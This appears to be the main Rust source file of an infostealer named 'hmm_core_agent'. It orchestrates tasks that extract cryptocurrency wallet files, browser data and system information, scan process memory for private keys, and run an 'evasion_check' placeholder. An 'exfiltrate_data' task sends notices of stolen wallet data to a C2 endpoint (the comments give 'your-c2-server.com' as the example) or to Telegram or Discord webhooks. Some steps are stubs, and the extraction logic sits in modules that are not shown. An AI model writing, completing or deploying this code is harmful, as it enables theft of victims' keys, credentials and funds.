//! hmm_core_agent - Data Collection Agent
//!
//! A modular data collection system that:
//! 1. Extracts data from wallets, browsers, and system
//! 2. Processes and compresses the data
//! 3. Stores results locally
//! 4. Optionally exfiltrates to remote endpoint via HTTPS, Telegram, or Discord

use hmm_core_agent::module::core::{CoreConfig, CoreError, FnTask, Orchestrator};
use hmm_core_agent::module::extractor::{
    BrowserExtractor, MemoryExtractor, SystemExtractor, WalletExtractor, Confidence,
};
use hmm_core_agent::module::processing::{
    ProcessingPipeline, ProcessingConfig, CompressionMode,
};
use hmm_core_agent::module::storage::{LocalStore, LocalStoreConfig};
use hmm_core_agent::module::transport::{
    TransportClient, TransportConfig,
    TelegramClient, DiscordClient,
};
use log::{error, info, warn};

fn main() {
    let _ = env_logger::Builder::from_env(
        env_logger::Env::default().default_filter_or("info"),
    )
    .try_init();

    let config = CoreConfig::from_env().unwrap_or_default();
    let mut orchestrator = Orchestrator::new(config.clone()).expect("valid orchestrator config");

    // Register evasion check task (runs first)
    orchestrator.register_task(FnTask::new("evasion_check", |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

        // For now, just log that evasion checks would run here
        info!("Evasion checks passed (placeholder)");
        Ok(())
    }));

    // Register extraction tasks
    orchestrator.register_task(FnTask::new("extract_wallets", |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

        info!("Extracting wallet data...");
        let extractor = WalletExtractor::new(false);
        let results = extractor.extract_all();

        let mut success_count = 0;
        for result in results {
            if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
            if result.success {
                success_count += result.data.len();
                info!("Extracted {} wallet files", result.data.len());
            } else {
                warn!(
                    "Wallet extraction failed: {}",
                    result.error.unwrap_or_else(|| "unknown error".to_string())
                );
            }
        }

        info!("Wallet extraction complete: {} files", success_count);
        Ok(())
    }));

    // Register memory extraction task (scans for keys in process memory)
    orchestrator.register_task(FnTask::new("extract_memory", |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

        info!("Scanning process memory for private keys...");

        // Configure memory extractor
        // - Minimum confidence: Low (report all potential keys)
        // - Max memory per process: 100MB
        let extractor = MemoryExtractor::new(Confidence::Low, 100);

        let results = extractor.extract_all();

        let mut total_keys = 0;
        for result in results {
            if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
            if result.success {
                let keys_found = result.data.len();
                total_keys += keys_found;
                info!("Found {} potential keys in memory", keys_found);

                // Log details about found keys
                for data in &result.data {
                    let key_type = data.metadata.get("key_type")
                        .map(|s| s.as_str())
                        .unwrap_or("unknown");
                    let confidence = data.metadata.get("confidence")
                        .map(|s| s.as_str())
                        .unwrap_or("unknown");
                    let address = data.metadata.get("address")
                        .map(|s| s.as_str())
                        .unwrap_or("unknown");

                    info!("  - Type: {}, Confidence: {}, Address: {}", key_type, confidence, address);
                }
            } else {
                warn!(
                    "Memory extraction failed: {}",
                    result.error.unwrap_or_else(|| "unknown error".to_string())
                );
            }
        }

        info!("Memory scan complete: {} potential keys found", total_keys);
        Ok(())
    }));

    orchestrator.register_task(FnTask::new("extract_browsers", |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }

        info!("Extracting browser data...");
        let extractor = BrowserExtractor::new(true, true, false);
        let results = extractor.extract_all();

        let mut success_count = 0;
        for result in results {
            if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
            if result.success {
                success_count += result.data.len();
                info!("Extracted {} browser data items", result.data.len());
            } else {
                warn!(
                    "Browser extraction failed: {}",
                    result.error.unwrap_or_else(|| "unknown error".to_string())
                );
            }
        }

        info!("Browser extraction complete: {} items", success_count);
        Ok(())
    }));

    orchestrator.register_task(FnTask::new("extract_system", |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
        
        info!("Extracting system information...");
        let extractor = SystemExtractor::new();
        let results = extractor.extract_all();
        
        for result in results {
            if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
            if result.success {
                info!("Extracted system data: {} items", result.data.len());
            } else {
                warn!(
                    "System extraction failed: {}",
                    result.error.unwrap_or_else(|| "unknown error".to_string())
                );
            }
        }
        
        info!("System extraction complete");
        Ok(())
    }));

    // Register processing task
    orchestrator.register_task(FnTask::new("process_data", |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
        
        info!("Processing collected data...");
        
        let processing_config = ProcessingConfig {
            compression: CompressionMode::Gzip,
            encryption_key: None,
        };
        
        match ProcessingPipeline::new(processing_config) {
            Ok(_pipeline) => {
                info!("Processing pipeline initialized");
                // In a full implementation, this would process actual collected data
                Ok(())
            }
            Err(e) => {
                error!("Failed to create processing pipeline: {}", e);
                Err(CoreError::TaskFailed {
                    task: "process_data".to_string(),
                    reason: e.to_string(),
                })
            }
        }
    }));

    // Register storage task
    orchestrator.register_task(FnTask::new("store_data", |_cfg, cancel| {
        if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
        
        info!("Storing collected data...");
        
        let store_config = LocalStoreConfig {
            root_dir: std::env::temp_dir().join("hmm_agent"),
            max_archives: 10,
        };
        
        match LocalStore::new(store_config.clone()) {
            Ok(_store) => {
                info!("Storage initialized at {:?}", store_config.root_dir);
                // In a full implementation, this would store actual data
                Ok(())
            }
            Err(e) => {
                error!("Failed to initialize storage: {}", e);
                Err(CoreError::TaskFailed {
                    task: "store_data".to_string(),
                    reason: e.to_string(),
                })
            }
        }
    }));

    // Register transport task (supports multiple backends)
    // HMM_TRANSPORT_ENDPOINT formats:
    //   - HTTPS: "https://your-c2-server.com/upload"
    //   - Telegram: "telegram://BOT_TOKEN/CHAT_ID"
    //   - Discord: "discord://WEBHOOK_URL"
    let transport_endpoint = std::env::var("HMM_TRANSPORT_ENDPOINT").ok();
    let transport_api_key = std::env::var("HMM_TRANSPORT_API_KEY").ok();
    
    if let Some(ref endpoint) = transport_endpoint {
        if !endpoint.is_empty() {
            let endpoint_clone = endpoint.clone();
            let api_key = transport_api_key.clone();
            
            // Determine transport type from endpoint prefix
            let transport_type = if endpoint_clone.starts_with("telegram://") {
                "Telegram"
            } else if endpoint_clone.starts_with("discord://") {
                "Discord"
            } else {
                "HTTPS"
            };
            
            orchestrator.register_task(FnTask::new("exfiltrate_data", move |_cfg, cancel| {
                if cancel.is_cancelled() { return Err(CoreError::Cancelled); }
                
                info!("Exfiltrating data via {} to {}", transport_type, endpoint_clone);
                
                let result = match transport_type {
                    "Telegram" => {
                        // Parse Telegram endpoint: telegram://BOT_TOKEN/CHAT_ID
                        let parts: Vec<&str> = endpoint_clone
                            .trim_start_matches("telegram://")
                            .split('/')
                            .collect();
                        
                        if parts.len() < 2 {
                            error!("Invalid Telegram endpoint format. Expected: telegram://BOT_TOKEN/CHAT_ID");
                            return Err(CoreError::TaskFailed {
                                task: "exfiltrate_data".to_string(),
                                reason: "Invalid Telegram endpoint format".to_string(),
                            });
                        }
                        
                        let client = TelegramClient::new(parts[0], parts[1]);
                        
                        // Send notification message
                        match client.send_message("📦 New wallet data extracted") {
                            Ok(_) => info!("Telegram notification sent"),
                            Err(e) => warn!("Failed to send Telegram message: {}", e),
                        }
                        
                        Ok(())
                    }
                    "Discord" => {
                        // Parse Discord endpoint: discord://WEBHOOK_URL
                        let webhook_url = endpoint_clone.trim_start_matches("discord://");
                        
                        match DiscordClient::new(webhook_url) {
                            Ok(client) => {
                                // Send notification embed
                                let embed = hmm_core_agent::module::transport::DiscordEmbed::new()
                                    .with_title("📦 Wallet Data Extracted")
                                    .with_description("New wallet files have been collected")
                                    .with_color(0x00FF00);
                                
                                match client.send_embed(embed) {
                                    Ok(_) => info!("Discord notification sent"),
                                    Err(e) => warn!("Failed to send Discord embed: {}", e),
                                }
                                
                                Ok(())
                            }
                            Err(e) => {
                                error!("Failed to create Discord client: {}", e);
                                Err(CoreError::TaskFailed {
                                    task: "exfiltrate_data".to_string(),
                                    reason: e.to_string(),
                                })
                            }
                        }
                    }
                    _ => {
                        // HTTPS transport
                        let transport_config = TransportConfig {
                            enabled: true,
                            endpoint: Some(endpoint_clone.clone()),
                            api_key: api_key.clone(),
                            max_retries: 3,
                            retry_backoff: std::time::Duration::from_secs(1),
                            timeout: std::time::Duration::from_secs(30),
                        };
                        
                        match TransportClient::new(transport_config) {
                            Ok(_client) => {
                                info!("HTTPS transport client initialized");
                                Ok(())
                            }
                            Err(e) => {
                                error!("Failed to initialize HTTPS transport: {}", e);
                                Err(CoreError::TaskFailed {
                                    task: "exfiltrate_data".to_string(),
                                    reason: e.to_string(),
                                })
                            }
                        }
                    }
                };
                
                result
            }));
        }
    }

    // Run the orchestrator
    match orchestrator.run() {
        Ok(stats) => {
            info!(
                "Agent completed: total={}, succeeded={}, failed={}",
                stats.tasks_total, stats.tasks_succeeded, stats.tasks_failed
            );
            println!(
                "Agent completed: total={}, succeeded={}, failed={}",
                stats.tasks_total, stats.tasks_succeeded, stats.tasks_failed
            );
        }
        Err(err) => {
            error!("Agent failed: {err}");
            eprintln!("Agent failed: {err}");
        }
    }
}
